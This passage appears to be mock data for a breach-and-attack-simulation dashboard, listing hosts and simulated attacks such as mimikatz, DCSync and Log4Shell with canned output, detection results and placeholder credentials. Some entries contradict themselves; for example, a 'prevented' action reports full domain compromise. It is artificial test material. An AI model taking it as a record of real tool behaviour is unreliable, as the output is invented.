      node_is_pivot:true,
    node_agents:['sentinel_one', 'openaev'],
    },
    { node_id:'s550EP-ep48', node_type:'ASSET', node_label:'DB-48', node_hostname:'DB-48',
      node_ip:'10.10.3.57', node_platform:'Windows 11', node_status:'detected',
      node_zone:'Restricted Net', node_subnet:'10.10.3.0/24',
      node_accessed_files:['C:\\Logs\\DB-48-audit.log'],
      node_credentials_found:['CORP\\db48:P@ss48!'],
    node_agents:['palo_alto'],
    },
    { node_id:'s550EP-ep49', node_type:'ASSET', node_label:'FILE-49', node_hostname:'FILE-49',
      node_ip:'10.10.3.58', node_platform:'Ubuntu 22.04 LTS', node_status:'undetected',
      node_zone:'Restricted Net', node_subnet:'10.10.3.0/24',
      node_accessed_files:['C:\\Logs\\FILE-49-audit.log'],
      node_credentials_found:['CORP\\file49:P@ss49!'],
    node_agents:['palo_alto'],
    },
    { node_id:'s550EP-ep50', node_type:'ASSET', node_label:'MAIL-50', node_hostname:'MAIL-50',
      node_ip:'10.10.3.59', node_platform:'Windows 10', node_status:'undetected',
      node_zone:'Restricted Net', node_subnet:'10.10.3.0/24',
      node_accessed_files:['C:\\Logs\\MAIL-50-audit.log'],
      node_credentials_found:['CORP\\mail50:P@ss50!'],
    node_agents:['sentinel_one', 'openaev'],
    },
    { node_id:'s550EP-a01', node_type:'ACTION', node_label:'nmap — Host Discovery (50 targets)',
      node_status:'undetected', node_hostname:'WEB-01', node_ip:'172.16.0.10',
      node_payload_name:'nmap-discovery', node_user_privileges:'root',
      node_executed_at:'2026-05-20 08:00:00 UTC', node_agent:'openaev',
      node_terminal_output:'Starting Nmap 50-host scan...\nHost 172.16.0.10 is up (0.003s latency).\n22/tcp open ssh\n445/tcp open microsoft-ds\n50 hosts scanned.',
    },
    { node_id:'s550EP-a02', node_type:'ACTION', node_label:'SharpHound → APP-02',
      node_status:'detected', node_hostname:'APP-02', node_ip:'172.16.0.11',
      node_payload_name:'SharpHound', node_user_privileges:'CORP\\dev.user',
      node_executed_at:'2026-05-20 08:06:00 UTC', node_agent:'openaev',
      node_terminal_output:'[*] SharpHound → APP-02 (172.16.0.11)\n[+] Connected\n[!] ALERT — session terminated by SOC',
      node_credentials_found:['CORP\\app02:P@ss02!'],
      node_accessed_files:['C:\\Logs\\APP-02-audit.log'],
      node_expectations:[{expectation_id:'s550EP-e01',expectation_type:'DETECTION',expectation_status:'SUCCEEDED',expectation_score:100,expectation_expected_score:100}],
    },
    { node_id:'s550EP-a03', node_type:'ACTION', node_label:'mimikatz-sekurlsa → DB-03',
      node_status:'detected', node_hostname:'DB-03', node_ip:'172.16.0.12',
      node_payload_name:'mimikatz-sekurlsa', node_user_privileges:'NT AUTHORITY\\SYSTEM',
      node_executed_at:'2026-05-20 08:10:00 UTC', node_agent:'openaev',
      node_terminal_output:'[*] mimikatz-sekurlsa → DB-03 (172.16.0.12)\n[+] Connected\n[!] ALERT — session terminated by SOC',
      node_credentials_found:['CORP\\db03:P@ss03!'],
      node_accessed_files:['C:\\Logs\\DB-03-audit.log'],
      node_expectations:[{expectation_id:'s550EP-e02',expectation_type:'DETECTION',expectation_status:'SUCCEEDED',expectation_score:100,expectation_expected_score:100}],
    },
    { node_id:'s550EP-a04', node_type:'ACTION', node_label:'SharpHound → FILE-04',
      node_status:'undetected', node_hostname:'FILE-04', node_ip:'172.16.0.13',
      node_payload_name:'SharpHound', node_user_privileges:'CORP\\it.admin',
      node_executed_at:'2026-05-20 08:18:00 UTC', node_agent:'openaev',
      node_terminal_output:`[nuclei] CVE-2021-44228 (Log4Shell) [critical]
[*] Target: FILE-04 (172.16.0.13)
[+] Vulnerable log4j-2.14.1 detected
[+] JNDI injection via User-Agent header
[+] DNS callback confirmed RCE
[+] Shell obtained as root`,
      node_credentials_found:['CORP\\file04:P@ss04!'],
      node_accessed_files:['C:\\Logs\\FILE-04-audit.log'],
    },
    { node_id:'s550EP-a05', node_type:'ACTION', node_label:'mimikatz-sekurlsa → MAIL-05',
      node_status:'undetected', node_hostname:'MAIL-05', node_ip:'172.16.0.14',
      node_payload_name:'mimikatz-sekurlsa', node_user_privileges:'CORP\\dev.user',
      node_executed_at:'2026-05-20 08:21:00 UTC', node_agent:'sentinel_one',
      node_terminal_output:'[*] mimikatz-sekurlsa → MAIL-05 (172.16.0.14)\n[+] Shell obtained\n[+] Privilege escalated\n[+] Host fully compromised',
      node_credentials_found:['CORP\\mail05:P@ss05!'],
      node_accessed_files:['C:\\Logs\\MAIL-05-audit.log'],
    },
    { node_id:'s550EP-a06', node_type:'ACTION', node_label:'DCSync-krbtgt → JUMP-06',
      node_status:'undetected', node_hostname:'JUMP-06', node_ip:'172.16.0.15',
      node_payload_name:'DCSync-krbtgt', node_user_privileges:'CORP\\domain_admin',
      node_executed_at:'2026-05-20 08:28:00 UTC', node_agent:'sentinel_one',
      node_terminal_output:'[*] DCSync-krbtgt → JUMP-06 (172.16.0.15)\n[+] Shell obtained\n[+] Privilege escalated\n[+] Host fully compromised',
      node_credentials_found:['CORP\\jump06:P@ss06!'],
      node_accessed_files:['C:\\Logs\\JUMP-06-audit.log'],
    },
    { node_id:'s550EP-a07', node_type:'ACTION', node_label:'netexec-smb-spray → PRINT-07',
      node_status:'undetected', node_hostname:'PRINT-07', node_ip:'172.16.0.16',
      node_payload_name:'netexec-smb-spray', node_user_privileges:'CORP\\domain_admin',
      node_executed_at:'2026-05-20 08:31:00 UTC', node_agent:'palo_alto',
      node_terminal_output:'[*] netexec-smb-spray → PRINT-07 (172.16.0.16)\n[+] Shell obtained\n[+] Privilege escalated\n[+] Host fully compromised',
      node_credentials_found:['CORP\\print07:P@ss07!'],
      node_accessed_files:['C:\\Logs\\PRINT-07-audit.log'],
    },
    { node_id:'s550EP-a08', node_type:'ACTION', node_label:'psexec-lateral → DNS-08',
      node_status:'undetected', node_hostname:'DNS-08', node_ip:'172.16.0.17',
      node_payload_name:'psexec-lateral', node_user_privileges:'CORP\\net.monitor',
      node_executed_at:'2026-05-20 08:38:00 UTC', node_agent:'palo_alto',
      node_terminal_output:'[*] psexec-lateral → DNS-08 (172.16.0.17)\n[+] Shell obtained\n[+] Privilege escalated\n[+] Host fully compromised',
      node_credentials_found:['CORP\\dns08:P@ss08!'],
      node_accessed_files:['C:\\Logs\\DNS-08-audit.log'],
    },
    { node_id:'s550EP-a09', node_type:'ACTION', node_label:'PowerView-recon → DC-09',
      node_status:'detected', node_hostname:'DC-09', node_ip:'172.16.0.18',
      node_payload_name:'PowerView-recon', node_user_privileges:'CORP\\svc_tomcat',
      node_executed_at:'2026-05-20 08:41:00 UTC', node_agent:'palo_alto',
      node_terminal_output:'[*] PowerView-recon → DC-09 (172.16.0.18)\n[+] Connected\n[!] ALERT — session terminated by SOC',
      node_credentials_found:['CORP\\dc09:P@ss09!'],
      node_accessed_files:['C:\\Logs\\DC-09-audit.log'],
      node_expectations:[{expectation_id:'s550EP-e08',expectation_type:'DETECTION',expectation_status:'SUCCEEDED',expectation_score:100,expectation_expected_score:100}],
    },
    { node_id:'s550EP-a10', node_type:'ACTION', node_label:'CrackMapExec → WS-10',
      node_status:'detected', node_hostname:'WS-10', node_ip:'172.16.0.19',
      node_payload_name:'CrackMapExec', node_user_privileges:'CORP\\svc_tomcat',
      node_executed_at:'2026-05-20 08:47:00 UTC', node_agent:'palo_alto',
      node_terminal_output:`[nuclei] CVE-2021-41773 (Apache RCE) [critical]
[*] Target: WS-10 (172.16.0.19)
[+] Apache 2.4.49 detected
[+] Path traversal + RCE via mod_cgi
[+] Shell as www-data -> root escalation`,
      node_credentials_found:['CORP\\ws10:P@ss10!'],
      node_accessed_files:['C:\\Logs\\WS-10-audit.log'],
      node_expectations:[{expectation_id:'s550EP-e09',expectation_type:'DETECTION',expectation_status:'SUCCEEDED',expectation_score:100,expectation_expected_score:100}],
    },
    { node_id:'s550EP-a11', node_type:'ACTION', node_label:'Rubeus-asktgt → API-11',
      node_status:'undetected', node_hostname:'API-11', node_ip:'172.16.0.20',
      node_payload_name:'Rubeus-asktgt', node_user_privileges:'CORP\\domain_admin',
      node_executed_at:'2026-05-20 08:52:00 UTC', node_agent:'openaev',
      node_terminal_output:'[*] Rubeus-asktgt → API-11 (172.16.0.20)\n[+] Shell obtained\n[+] Privilege escalated\n[+] Host fully compromised',
      node_credentials_found:['CORP\\api11:P@ss11!'],
      node_accessed_files:['C:\\Logs\\API-11-audit.log'],
    },
    { node_id:'s550EP-a12', node_type:'ACTION', node_label:'psexec-lateral → BACKUP-12',
      node_status:'undetected', node_hostname:'BACKUP-12', node_ip:'172.16.0.21',
      node_payload_name:'psexec-lateral', node_user_privileges:'CORP\\dev.user',
      node_executed_at:'2026-05-20 08:58:00 UTC', node_agent:'sentinel_one',
      node_terminal_output:'[*] psexec-lateral → BACKUP-12 (172.16.0.21)\n[+] Shell obtained\n[+] Privilege escalated\n[+] Host fully compromised',
      node_credentials_found:['CORP\\backup12:P@ss12!'],
      node_accessed_files:['C:\\Logs\\BACKUP-12-audit.log'],
    },
    { node_id:'s550EP-a13', node_type:'ACTION', node_label:'Rubeus-asktgt → MONITOR-13',
      node_status:'undetected', node_hostname:'MONITOR-13', node_ip:'172.16.0.22',
      node_payload_name:'Rubeus-asktgt', node_user_privileges:'CORP\\it.admin',
      node_executed_at:'2026-05-20 09:02:00 UTC', node_agent:'palo_alto',
      node_terminal_output:`Starting Nmap 7.94 ( https://nmap.org ) at 2026-05-20 08:00 UTC
Nmap scan report for MONITOR-13 (172.16.0.22)
Host is up (0.003s latency).
22/tcp   open  ssh
80/tcp   open  http
443/tcp  open  https
9090/tcp open  zeus-admin

Nmap done: 1 IP address (1 host up) scanned in 2.43 seconds`,
      node_credentials_found:['CORP\\monitor13:P@ss13!'],
      node_accessed_files:['C:\\Logs\\MONITOR-13-audit.log'],
    },
    { node_id:'s550EP-a14', node_type:'ACTION', node_label:'mimikatz-sekurlsa → VPN-14',
      node_status:'detected', node_hostname:'VPN-14', node_ip:'10.10.1.63',
      node_payload_name:'mimikatz-sekurlsa', node_user_privileges:'CORP\\it.admin',
      node_executed_at:'2026-05-20 09:07:00 UTC', node_agent:'sentinel_one',
      node_terminal_output:'[*] mimikatz-sekurlsa → VPN-14 (10.10.1.63)\n[+] Connected\n[!] ALERT — session terminated by SOC',
      node_credentials_found:['CORP\\vpn14:P@ss14!'],
      node_accessed_files:['C:\\Logs\\VPN-14-audit.log'],
      node_expectations:[{expectation_id:'s550EP-e13',expectation_type:'DETECTION',expectation_status:'SUCCEEDED',expectation_score:100,expectation_expected_score:100}],
    },
    { node_id:'s550EP-a15', node_type:'ACTION', node_label:'reg-sam-dump → SIEM-15',
      node_status:'undetected', node_hostname:'SIEM-15', node_ip:'10.10.1.64',
      node_payload_name:'reg-sam-dump', node_user_privileges:'NT AUTHORITY\\SYSTEM',
      node_executed_at:'2026-05-20 09:13:00 UTC', node_agent:'openaev',
      node_terminal_output:'[*] reg-sam-dump → SIEM-15 (10.10.1.64)\n[+] Shell obtained\n[+] Privilege escalated\n[+] Host fully compromised',
      node_credentials_found:['CORP\\siem15:P@ss15!'],
      node_accessed_files:['C:\\Logs\\SIEM-15-audit.log'],
    },
    { node_id:'s550EP-a16', node_type:'ACTION', node_label:'PowerView-recon → WEB-16',
      node_status:'undetected', node_hostname:'WEB-16', node_ip:'10.10.1.65',
      node_payload_name:'PowerView-recon', node_user_privileges:'CORP\\it.admin',
      node_executed_at:'2026-05-20 09:15:00 UTC', node_agent:'sentinel_one',
      node_terminal_output:'[*] PowerView-recon → WEB-16 (10.10.1.65)\n[+] Shell obtained\n[+] Privilege escalated\n[+] Host fully compromised',
      node_credentials_found:['CORP\\web16:P@ss16!'],
      node_accessed_files:['C:\\Logs\\WEB-16-audit.log'],
    },
    { node_id:'s550EP-a17', node_type:'ACTION', node_label:'mimikatz-sekurlsa → APP-17',
      node_status:'undetected', node_hostname:'APP-17', node_ip:'10.10.1.66',
      node_payload_name:'mimikatz-sekurlsa', node_user_privileges:'CORP\\net.monitor',
      node_executed_at:'2026-05-20 09:22:00 UTC', node_agent:'sentinel_one',
      node_terminal_output:'[*] mimikatz-sekurlsa → APP-17 (10.10.1.66)\n[+] Shell obtained\n[+] Privilege escalated\n[+] Host fully compromised',
      node_credentials_found:['CORP\\app17:P@ss17!'],
      node_accessed_files:['C:\\Logs\\APP-17-audit.log'],
    },
    { node_id:'s550EP-a18', node_type:'ACTION', node_label:'netexec-smb-spray → DB-18',
      node_status:'undetected', node_hostname:'DB-18', node_ip:'10.10.1.67',
      node_payload_name:'netexec-smb-spray', node_user_privileges:'CORP\\domain_admin',
      node_executed_at:'2026-05-20 09:28:00 UTC', node_agent:'openaev',
      node_terminal_output:`[nuclei] CVE-2021-34527 (PrintNightmare) [critical]
[*] Target: DB-18 (10.10.1.67)
[+] Windows Print Spooler detected (spoolsv.exe)
[+] RCE via AddPrinterDriverEx() - arbitrary DLL load
[+] Privilege escalated to SYSTEM
[+] Host fully compromised`,
      node_credentials_found:['CORP\\db18:P@ss18!'],
      node_accessed_files:['C:\\Logs\\DB-18-audit.log'],
    },
    { node_id:'s550EP-a19', node_type:'ACTION', node_label:'mimikatz-sekurlsa → FILE-19',
      node_status:'undetected', node_hostname:'FILE-19', node_ip:'10.10.1.68',
      node_payload_name:'mimikatz-sekurlsa', node_user_privileges:'CORP\\domain_admin',
      node_executed_at:'2026-05-20 09:31:00 UTC', node_agent:'palo_alto',
      node_terminal_output:'[*] mimikatz-sekurlsa → FILE-19 (10.10.1.68)\n[+] Shell obtained\n[+] Privilege escalated\n[+] Host fully compromised',
      node_credentials_found:['CORP\\file19:P@ss19!'],
      node_accessed_files:['C:\\Logs\\FILE-19-audit.log'],
    },
    { node_id:'s550EP-a20', node_type:'ACTION', node_label:'pass-the-hash → MAIL-20',
      node_status:'detected', node_hostname:'MAIL-20', node_ip:'10.10.1.69',
      node_payload_name:'pass-the-hash', node_user_privileges:'CORP\\dev.user',
      node_executed_at:'2026-05-20 09:38:00 UTC', node_agent:'openaev',
      node_terminal_output:'[*] pass-the-hash → MAIL-20 (10.10.1.69)\n[+] Connected\n[!] ALERT — session terminated by SOC',
      node_credentials_found:['CORP\\mail20:P@ss20!'],
      node_accessed_files:['C:\\Logs\\MAIL-20-audit.log'],
      node_expectations:[{expectation_id:'s550EP-e19',expectation_type:'DETECTION',expectation_status:'SUCCEEDED',expectation_score:100,expectation_expected_score:100}],
    },
    { node_id:'s550EP-a21', node_type:'ACTION', node_label:'PrintNightmare-LPE → JUMP-21',
      node_status:'undetected', node_hostname:'JUMP-21', node_ip:'10.10.1.70',
      node_payload_name:'PrintNightmare-LPE', node_user_privileges:'CORP\\it.admin',
      node_executed_at:'2026-05-20 09:41:00 UTC', node_agent:'sentinel_one',
      node_terminal_output:'[*] PrintNightmare-LPE → JUMP-21 (10.10.1.70)\n[+] Shell obtained\n[+] Privilege escalated\n[+] Host fully compromised',
      node_credentials_found:['CORP\\jump21:P@ss21!'],
      node_accessed_files:['C:\\Logs\\JUMP-21-audit.log'],
    },
    { node_id:'s550EP-a22', node_type:'ACTION', node_label:'Rubeus-asktgt → PRINT-22',
      node_status:'undetected', node_hostname:'PRINT-22', node_ip:'10.10.1.71',
      node_payload_name:'Rubeus-asktgt', node_user_privileges:'CORP\\it.admin',
      node_executed_at:'2026-05-20 09:47:00 UTC', node_agent:'openaev',
      node_terminal_output:`[nuclei] CVE-2022-22965 (Spring4Shell) [critical]
[*] Target: PRINT-22 (10.10.1.71)
[+] Spring Framework 5.3.17 detected
[+] DataBinder classLoader hijacking
[+] JSP webshell uploaded
[+] RCE confirmed as tomcat -> root`,
      node_credentials_found:['CORP\\print22:P@ss22!'],
      node_accessed_files:['C:\\Logs\\PRINT-22-audit.log'],
    },
    { node_id:'s550EP-a23', node_type:'ACTION', node_label:'Rubeus-asktgt → DNS-23',
      node_status:'undetected', node_hostname:'DNS-23', node_ip:'10.10.1.72',
      node_payload_name:'Rubeus-asktgt', node_user_privileges:'CORP\\domain_admin',
      node_executed_at:'2026-05-20 09:50:00 UTC', node_agent:'sentinel_one',
      node_terminal_output:'[*] Rubeus-asktgt → DNS-23 (10.10.1.72)\n[+] Shell obtained\n[+] Privilege escalated\n[+] Host fully compromised',
      node_credentials_found:['CORP\\dns23:P@ss23!'],
      node_accessed_files:['C:\\Logs\\DNS-23-audit.log'],
    },
    { node_id:'s550EP-a24', node_type:'ACTION', node_label:'SharpHound → DC-24',
      node_status:'prevented', node_hostname:'DC-24', node_ip:'10.10.1.73',
      node_payload_name:'SharpHound', node_user_privileges:'CORP\\net.monitor',
      node_executed_at:'2026-05-20 09:55:00 UTC', node_agent:'openaev',
      node_terminal_output:'[*] SharpHound → DC-24 (10.10.1.73)\n[-] BLOCKED by endpoint protection\n[!] Prevented at DC-24',
      node_expectations:[{expectation_id:'s550EP-e23',expectation_type:'PREVENTION',expectation_status:'SUCCEEDED',expectation_score:100,expectation_expected_score:100}],
    },
    { node_id:'s550EP-a25', node_type:'ACTION', node_label:'wdigest-dump → WS-25',
      node_status:'undetected', node_hostname:'WS-25', node_ip:'10.10.1.74',
      node_payload_name:'wdigest-dump', node_user_privileges:'CORP\\dev.user',
      node_executed_at:'2026-05-20 10:03:00 UTC', node_agent:'palo_alto',
      node_terminal_output:'[*] wdigest-dump → WS-25 (10.10.1.74)\n[+] Shell obtained\n[+] Privilege escalated\n[+] Host fully compromised',
      node_credentials_found:['CORP\\ws25:P@ss25!'],
      node_accessed_files:['C:\\Logs\\WS-25-audit.log'],
    },
    { node_id:'s550EP-a26', node_type:'ACTION', node_label:'DCSync-krbtgt → API-26',
      node_status:'detected', node_hostname:'API-26', node_ip:'10.10.2.35',
      node_payload_name:'DCSync-krbtgt', node_user_privileges:'CORP\\net.monitor',
      node_executed_at:'2026-05-20 10:05:00 UTC', node_agent:'sentinel_one',
      node_terminal_output:'[*] DCSync-krbtgt → API-26 (10.10.2.35)\n[+] Connected\n[!] ALERT — session terminated by SOC',
      node_credentials_found:['CORP\\api26:P@ss26!'],
      node_accessed_files:['C:\\Logs\\API-26-audit.log'],
      node_expectations:[{expectation_id:'s550EP-e25',expectation_type:'DETECTION',expectation_status:'SUCCEEDED',expectation_score:100,expectation_expected_score:100}],
    },
    { node_id:'s550EP-a27', node_type:'ACTION', node_label:'psexec-lateral → BACKUP-27',
      node_status:'undetected', node_hostname:'BACKUP-27', node_ip:'10.10.2.36',
      node_payload_name:'psexec-lateral', node_user_privileges:'CORP\\domain_admin',
      node_executed_at:'2026-05-20 10:12:00 UTC', node_agent:'sentinel_one',
      node_terminal_output:'[*] psexec-lateral → BACKUP-27 (10.10.2.36)\n[+] Shell obtained\n[+] Privilege escalated\n[+] Host fully compromised',
      node_credentials_found:['CORP\\backup27:P@ss27!'],
      node_accessed_files:['C:\\Logs\\BACKUP-27-audit.log'],
    },
    { node_id:'s550EP-a28', node_type:'ACTION', node_label:'wdigest-dump → MONITOR-28',
      node_status:'undetected', node_hostname:'MONITOR-28', node_ip:'10.10.2.37',
      node_payload_name:'wdigest-dump', node_user_privileges:'NT AUTHORITY\\SYSTEM',
      node_executed_at:'2026-05-20 10:17:00 UTC', node_agent:'sentinel_one',
      node_terminal_output:'[*] wdigest-dump → MONITOR-28 (10.10.2.37)\n[+] Shell obtained\n[+] Privilege escalated\n[+] Host fully compromised',
      node_credentials_found:['CORP\\monitor28:P@ss28!'],
      node_accessed_files:['C:\\Logs\\MONITOR-28-audit.log'],
    },
    { node_id:'s550EP-a29', node_type:'ACTION', node_label:'wdigest-dump → VPN-29',
      node_status:'undetected', node_hostname:'VPN-29', node_ip:'10.10.2.38',
      node_payload_name:'wdigest-dump', node_user_privileges:'CORP\\svc_tomcat',
      node_executed_at:'2026-05-20 10:23:00 UTC', node_agent:'sentinel_one',
      node_terminal_output:'[*] wdigest-dump → VPN-29 (10.10.2.38)\n[+] Shell obtained\n[+] Privilege escalated\n[+] Host fully compromised',
      node_credentials_found:['CORP\\vpn29:P@ss29!'],
      node_accessed_files:['C:\\Logs\\VPN-29-audit.log'],
    },
    { node_id:'s550EP-a30', node_type:'ACTION', node_label:'psexec-lateral → SIEM-30',
      node_status:'prevented', node_hostname:'SIEM-30', node_ip:'10.10.2.39',
      node_payload_name:'psexec-lateral', node_user_privileges:'CORP\\svc_tomcat',
      node_executed_at:'2026-05-20 10:25:00 UTC', node_agent:'openaev',
      node_terminal_output:`[nuclei] CVE-2020-1472 (Zerologon) [critical]
[*] Target: DC-30 (10.10.2.39)
[+] Domain Controller detected
[+] Netlogon brute-force - machine account reset
[+] DCSync: all domain hashes dumped
[+] Domain fully compromised`,
      node_expectations:[{expectation_id:'s550EP-e29',expectation_type:'PREVENTION',expectation_status:'SUCCEEDED',expectation_score:100,expectation_expected_score:100}],
    },
    { node_id:'s550EP-a31', node_type:'ACTION', node_label:'pass-the-hash → WEB-31',
      node_status:'undetected', node_hostname:'WEB-31', node_ip:'10.10.2.40',
      node_payload_name:'pass-the-hash', node_user_privileges:'CORP\\dev.user',
      node_executed_at:'2026-05-20 10:30:00 UTC', node_agent:'openaev',
      node_terminal_output:'[*] pass-the-hash → WEB-31 (10.10.2.40)\n[+] Shell obtained\n[+] Privilege escalated\n[+] Host fully compromised',
      node_credentials_found:['CORP\\web31:P@ss31!'],
      node_accessed_files:['C:\\Logs\\WEB-31-audit.log'],
    },
    { node_id:'s550EP-a32', node_type:'ACTION', node_label:'nmap-discovery → APP-32',
      node_status:'undetected', node_hostname:'APP-32', node_ip:'10.10.2.41',
      node_payload_name:'nmap-discovery', node_user_privileges:'CORP\\domain_admin',
      node_executed_at:'2026-05-20 10:37:00 UTC', node_agent:'openaev',
      node_terminal_output:'[*] nmap-discovery → APP-32 (10.10.2.41)\n[+] Shell obtained\n[+] Privilege escalated\n[+] Host fully compromised',
      node_credentials_found:['CORP\\app32:P@ss32!'],
      node_accessed_files:['C:\\Logs\\APP-32-audit.log'],
    },
    { node_id:'s550EP-a33', node_type:'ACTION', node_label:'pass-the-hash → DB-33',
      node_status:'undetected', node_hostname:'DB-33', node_ip:'10.10.2.42',
      node_payload_name:'pass-the-hash', node_user_privileges:'NT AUTHORITY\\SYSTEM',
      node_executed_at:'2026-05-20 10:41:00 UTC', node_agent:'palo_alto',
      node_terminal_output:'[*] pass-the-hash → DB-33 (10.10.2.42)\n[+] Shell obtained\n[+] Privilege escalated\n[+] Host fully compromised',
      node_credentials_found:['CORP\\db33:P@ss33!'],
      node_accessed_files:['C:\\Logs\\DB-33-audit.log'],
    },
    { node_id:'s550EP-a34', node_type:'ACTION', node_label:'CrackMapExec → FILE-34',
      node_status:'detected', node_hostname:'FILE-34', node_ip:'10.10.2.43',
      node_payload_name:'CrackMapExec', node_user_privileges:'CORP\\dev.user',
      node_executed_at:'2026-05-20 10:45:00 UTC', node_agent:'palo_alto',
      node_terminal_output:'[*] CrackMapExec → FILE-34 (10.10.2.43)\n[+] Connected\n[!] ALERT — session terminated by SOC',
      node_credentials_found:['CORP\\file34:P@ss34!'],
      node_accessed_files:['C:\\Logs\\FILE-34-audit.log'],
      node_expectations:[{expectation_id:'s550EP-e33',expectation_type:'DETECTION',expectation_status:'SUCCEEDED',expectation_score:100,expectation_expected_score:100}],
    },
    { node_id:'s550EP-a35', node_type:'ACTION', node_label:'Rubeus-asktgt → MAIL-35',
      node_status:'undetected', node_hostname:'MAIL-35', node_ip:'10.10.2.44',
      node_payload_name:'Rubeus-asktgt', node_user_privileges:'CORP\\svc_tomcat',
      node_executed_at:'2026-05-20 10:50:00 UTC', node_agent:'openaev',
      node_terminal_output:'[*] Rubeus-asktgt → MAIL-35 (10.10.2.44)\n[+] Shell obtained\n[+] Privilege escalated\n[+] Host fully compromised',
      node_credentials_found:['CORP\\mail35:P@ss35!'],
      node_accessed_files:['C:\\Logs\\MAIL-35-audit.log'],
    },
    { node_id:'s550EP-a36', node_type:'ACTION', node_label:'PrintNightmare-LPE → JUMP-36',
      node_status:'undetected', node_hostname:'JUMP-36', node_ip:'10.10.2.45',
      node_payload_name:'PrintNightmare-LPE', node_user_privileges:'CORP\\svc_tomcat',
      node_executed_at:'2026-05-20 10:58:00 UTC', node_agent:'sentinel_one',
      node_terminal_output:'[*] PrintNightmare-LPE → JUMP-36 (10.10.2.45)\n[+] Shell obtained\n[+] Privilege escalated\n[+] Host fully compromised',
      node_credentials_found:['CORP\\jump36:P@ss36!'],
      node_accessed_files:['C:\\Logs\\JUMP-36-audit.log'],
    },
    { node_id:'s550EP-a37', node_type:'ACTION', node_label:'netexec-smb-spray → PRINT-37',
      node_status:'prevented', node_hostname:'PRINT-37', node_ip:'10.10.2.46',
      node_payload_name:'netexec-smb-spray', node_user_privileges:'CORP\\dev.user',
      node_executed_at:'2026-05-20 11:02:00 UTC', node_agent:'palo_alto',
      node_terminal_output:'[*] netexec-smb-spray → PRINT-37 (10.10.2.46)\n[-] BLOCKED by endpoint protection\n[!] Prevented at PRINT-37',
      node_expectations:[{expectation_id:'s550EP-e36',expectation_type:'PREVENTION',expectation_status:'SUCCEEDED',expectation_score:100,expectation_expected_score:100}],
    },
    { node_id:'s550EP-a38', node_type:'ACTION', node_label:'Rubeus-asktgt → DNS-38',
      node_status:'detected', node_hostname:'DNS-38', node_ip:'10.10.2.47',
      node_payload_name:'Rubeus-asktgt', node_user_privileges:'CORP\\dev.user',
      node_executed_at:'2026-05-20 11:08:00 UTC', node_agent:'openaev',
      node_terminal_output:'[*] Rubeus-asktgt → DNS-38 (10.10.2.47)\n[+] Connected\n[!] ALERT — session terminated by SOC',
      node_credentials_found:['CORP\\dns38:P@ss38!'],
      node_accessed_files:['C:\\Logs\\DNS-38-audit.log'],
      node_expectations:[{expectation_id:'s550EP-e37',expectation_type:'DETECTION',expectation_status:'SUCCEEDED',expectation_score:100,expectation_expected_score:100}],
    },
    { node_id:'s550EP-a39', node_type:'ACTION', node_label:'SharpHound → DC-39',
      node_status:'undetected', node_hostname:'DC-39', node_ip:'10.10.3.48',
      node_payload_name:'SharpHound', node_user_privileges:'NT AUTHORITY\\SYSTEM',
      node_executed_at:'2026-05-20 11:11:00 UTC', node_agent:'openaev',
      node_terminal_output:'[*] SharpHound → DC-39 (10.10.3.48)\n[+] Shell obtained\n[+] Privilege escalated\n[+] Host fully compromised',
      node_credentials_found:['CORP\\dc39:P@ss39!'],
      node_accessed_files:['C:\\Logs\\DC-39-audit.log'],
    },
    { node_id:'s550EP-a40', node_type:'ACTION', node_label:'nmap-discovery → WS-40',
      node_status:'prevented', node_hostname:'WS-40', node_ip:'10.10.3.49',
      node_payload_name:'nmap-discovery', node_user_privileges:'NT AUTHORITY\\SYSTEM',
      node_executed_at:'2026-05-20 11:17:00 UTC', node_agent:'openaev',
      node_terminal_output:'[*] nmap-discovery → WS-40 (10.10.3.49)\n[-] BLOCKED by endpoint protection\n[!] Prevented at WS-40',
      node_expectations:[{expectation_id:'s550EP-e39',expectation_type:'PREVENTION',expectation_status:'SUCCEEDED',expectation_score:100,expectation_expected_score:100}],
    },
    { node_id:'s550EP-a41', node_type:'ACTION', node_label:'CrackMapExec → API-41',
      node_status:'detected', node_hostname:'API-41', node_ip:'10.10.3.50',
      node_payload_name:'CrackMapExec', node_user_privileges:'CORP\\svc_tomcat',
      node_executed_at:'2026-05-20 11:23:00 UTC', node_agent:'openaev',
      node_terminal_output:'[*] CrackMapExec → API-41 (10.10.3.50)\n[+] Connected\n[!] ALERT — session terminated by SOC',
      node_credentials_found:['CORP\\api41:P@ss41!'],
      node_accessed_files:['C:\\Logs\\API-41-audit.log'],
      node_expectations:[{expectation_id:'s550EP-e40',expectation_type:'DETECTION',expectation_status:'SUCCEEDED',expectation_score:100,expectation_expected_score:100}],
    },
    { node_id:'s550EP-a42', node_type:'ACTION', node_label:'DCSync-krbtgt → BACKUP-42',
      node_status:'prevented', node_hostname:'BACKUP-42', node_ip:'10.10.3.51',
      node_payload_name:'DCSync-krbtgt', node_user_privileges:'CORP\\svc_tomcat',
      node_executed_at:'2026-05-20 11:28:00 UTC', node_agent:'sentinel_one',
      node_terminal_output:`Starting Nmap 7.94 ( https://nmap.org ) at 2026-05-20 08:00 UTC
Nmap scan report for JUMP-42 (10.10.3.41)
Host is up (0.003s latency).
22/tcp   open  ssh
3389/tcp open  ms-wbt-server
5985/tcp open  wsman

Nmap done: 1 IP address (1 host up) scanned in 2.43 seconds`,
      node_expectations:[{expectation_id:'s550EP-e41',expectation_type:'PREVENTION',expectation_status:'SUCCEEDED',expectation_score:100,expectation_expected_score:100}],
    },
    { node_id:'s550EP-a43', node_type:'ACTION', node_label:'reg-sam-dump → MONITOR-43',
      node_status:'undetected', node_hostname:'MONITOR-43', node_ip:'10.10.3.52',
      node_payload_name:'reg-sam-dump', node_user_privileges:'CORP\\dev.user',
      node_executed_at:'2026-05-20 11:31:00 UTC', node_agent:'openaev',
      node_terminal_output:'[*] reg-sam-dump → MONITOR-43 (10.10.3.52)\n[+] Shell obtained\n[+] Privilege escalated\n[+] Host fully compromised',
      node_credentials_found:['CORP\\monitor43:P@ss43!'],
      node_accessed_files:['C:\\Logs\\MONITOR-43-audit.log'],
    },
    { node_id:'s550EP-a44', node_type:'ACTION', node_label:'PowerView-recon → VPN-44',
      node_status:'detected', node_hostname:'VPN-44', node_ip:'10.10.3.53',
      node_payload_name:'PowerView-recon', node_user_privileges:'CORP\\domain_admin',
      node_executed_at:'2026-05-20 11:37:00 UTC', node_agent:'palo_alto',
      node_terminal_output:'[*] PowerView-recon → VPN-44 (10.10.3.53)\n[+] Connected\n[!] ALERT — session terminated by SOC',
      node_credentials_found:['CORP\\vpn44:P@ss44!'],
      node_accessed_files:['C:\\Logs\\VPN-44-audit.log'],
